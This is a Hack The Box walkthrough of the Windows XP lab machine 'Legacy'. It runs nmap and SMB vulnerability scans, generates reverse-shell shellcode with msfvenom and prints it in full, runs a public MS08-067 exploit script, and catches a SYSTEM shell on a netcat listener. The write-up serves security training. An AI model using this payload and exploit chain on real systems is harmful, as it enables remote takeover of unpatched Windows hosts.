+++
draft = false
date = 2020-06-28T16:04:02+01:00
title = "Legacy"
description = ""
slug = ""
tags = []
categories = []
externalLink = ""
series = []
weight = 9
+++

# Machine info

- OS : Windows
- Difficulty : Easy
- Points : 20
- IP : 10.10.10.4

# Mind Map
![Legacy_MindMap](/images/htb/legacy_mindmap.png)

&nbsp;

# Recon

Let's see the `nmap` scan result:

```
Nmap scan report for 10.10.10.4
Host is up (0.068s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d00h27m38s, deviation: 2h07m16s, median: 4d22h57m38s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:36:42 (VMware)
| smb-os-discovery:
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2020-07-04T14:49:56+03:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
```

We have as open ports only the `139` and `445`.

&nbsp;

# Enumeration

Let's conduct a script scan versus the SMB service to see if it is vulnerable to a known exploit:

```
nmap --script smb-vuln* 10.10.10.4 -p 445 -n

Nmap scan report for 10.10.10.4
Host is up (0.15s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms08-067:
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:                                                                                                                                                             
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/                                                                         
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx                                                                                                    
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
```

**->** SMB appears to be vulnerable to the well known **MS08-067** and **MS17-010**. We will exploit the `MS08-067` vulnerability without Metasploit.

**Note**: There are 2 modules (for both the vulnerabilities) available in Metasploit that can perform the exploitation automatically.


&nbsp;

# Exploitation

On the web we can find different exploit scripts: https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py.

After reading the code, we can see that the exploit requires us to replace the default shellcode with a custom one. To make the shellcode, we can use the following options in `msfvenom`:

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.8 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows -v shellcode

Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 348 (iteration=0)
x86/call4_dword_xor chosen with final size 348
Payload size: 348 bytes
Final size of c file: 1494 bytes
unsigned char shellcode[] =
"\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\x63\xad\xf8\xc0\x83\xee\xfc\xe2\xf4\x9f\x45\x7a\xc0\x63\xad"
"\x98\x49\x86\x9c\x38\xa4\xe8\xfd\xc8\x4b\x31\xa1\x73\x92\x77"
"\x26\x8a\xe8\x6c\x1a\xb2\xe6\x52\x52\x54\xfc\x02\xd1\xfa\xec"
"\x43\x6c\x37\xcd\x62\x6a\x1a\x32\x31\xfa\x73\x92\x73\x26\xb2"
"\xfc\xe8\xe1\xe9\xb8\x80\xe5\xf9\x11\x32\x26\xa1\xe0\x62\x7e"
"\x73\x89\x7b\x4e\xc2\x89\xe8\x99\x73\xc1\xb5\x9c\x07\x6c\xa2"
"\x62\xf5\xc1\xa4\x95\x18\xb5\x95\xae\x85\x38\x58\xd0\xdc\xb5"
"\x87\xf5\x73\x98\x47\xac\x2b\xa6\xe8\xa1\xb3\x4b\x3b\xb1\xf9"
"\x13\xe8\xa9\x73\xc1\xb3\x24\xbc\xe4\x47\xf6\xa3\xa1\x3a\xf7"
"\xa9\x3f\x83\xf2\xa7\x9a\xe8\xbf\x13\x4d\x3e\xc5\xcb\xf2\x63"
"\xad\x90\xb7\x10\x9f\xa7\x94\x0b\xe1\x8f\xe6\x64\x52\x2d\x78"
"\xf3\xac\xf8\xc0\x4a\x69\xac\x90\x0b\x84\x78\xab\x63\x52\x2d"
"\x90\x33\xfd\xa8\x80\x33\xed\xa8\xa8\x89\xa2\x27\x20\x9c\x78"
"\x6f\xaa\x66\xc5\xf2\xca\x6d\xa5\x90\xc2\x63\xac\x43\x49\x85"
"\xc7\xe8\x96\x34\xc5\x61\x65\x17\xcc\x07\x15\xe6\x6d\x8c\xcc"
"\x9c\xe3\xf0\xb5\x8f\xc5\x08\x75\xc1\xfb\x07\x15\x0b\xce\x95"
"\xa4\x63\x24\x1b\x97\x34\xfa\xc9\x36\x09\xbf\xa1\x96\x81\x50"
"\x9e\x07\x27\x89\xc4\xc1\x62\x20\xbc\xe4\x73\x6b\xf8\x84\x37"
"\xfd\xae\x96\x35\xeb\xae\x8e\x35\xfb\xab\x96\x0b\xd4\x34\xff"
"\xe5\x52\x2d\x49\x83\xe3\xae\x86\x9c\x9d\x90\xc8\xe4\xb0\x98"
"\x3f\xb6\x16\x18\xdd\x49\xa7\x90\x66\xf6\x10\x65\x3f\xb6\x91"
"\xfe\xbc\x69\x2d\x03\x20\x16\xa8\x43\x87\x70\xdf\x97\xaa\x63"
"\xfe\x07\x15";
```

Where:
- `-p` specifies the payload we want to use
- `LHOST` and `LPORT` are the IP address assigned to our machine
- `EXITFUNC` will be useful in some cases where after we exploited a box, we need a clean exit
- `-b` specifies the bad characters for the payload
- `-f` specifies the output, in this case it will be `C`
- `-a` specifies the system architecture
- `-v` specifies the variable that will store the payload

At this point we have to edit the exploit file including our own payload and set up a listener on port 443.
The exploit requires that we know the version of Windows and the Language Pack. Apparently the exploit takes advantage of knowing where some little bits of code will be in memory, and uses those bits on the path to shell. For different version of Windows, the addresses of those gadgets will be different.

From the initial scan result we know that the system is running a **Windows XP version**. We will start with target `6` first (Win XP SP3 English), and if that fails, we'll try others.

Let's run the exploit: (setting up a netcat listener on port 443)

```
python exploit.py 10.10.10.4 6 445
#######################################################################
#   MS08-067 Exploit
#   This is a modified verion of Debasis Mohanty's code (https://www.exploit-db.com/exploits/7132/).
#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi
#
#   Mod in 2018 by Andy Acer
#   - Added support for selecting a target port at the command line.
#   - Changed library calls to allow for establishing a NetBIOS session for SMB transport
#   - Changed shellcode handling to allow for variable length shellcode.
#######################################################################


$   This version requires the Python Impacket library version to 0_9_17 or newer.
$
$   Here's how to upgrade if necessary:
$
$   git clone --branch impacket_0_9_17 --single-branch https://github.com/CoreSecurity/impacket/
$   cd impacket
$   pip install .


#######################################################################

Windows XP SP3 English (NX)

[-]Initiating connection
[-]connected to ncacn_np:10.10.10.4[\pipe\browser]
Exploit finish
```

And we get a shell:

```
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.4] 1031
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```

`Windows XP` doesn't have a `whoami` command. So, how can we know which kind of user are we?

```
C:\WINDOWS\system32>whoami
whoami
'whoami' is not recognized as an internal or external command,
operable program or batch file.
```

Kali has a `whoami.exe` by default under `/usr/share/windows-resources/binaries`/. We can share the executable with the target machine via SMB:

```
python3 /opt/impacket/examples/smbserver.py whoami /usr/share/windows-binaries/
Impacket v0.9.19 - Copyright 2018 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Where `whoami` is the share name and `/usr/share/windows-binaries/` its path.

On the target:

```
C:\WINDOWS\system32>copy \\10.10.14.14\whoami\whoami.exe
NT AUTHORITY\SYSTEM
```

**Note**: flags are under `C:\Documents and Setting\john` and `C:\Documents and Setting\Administrator`.
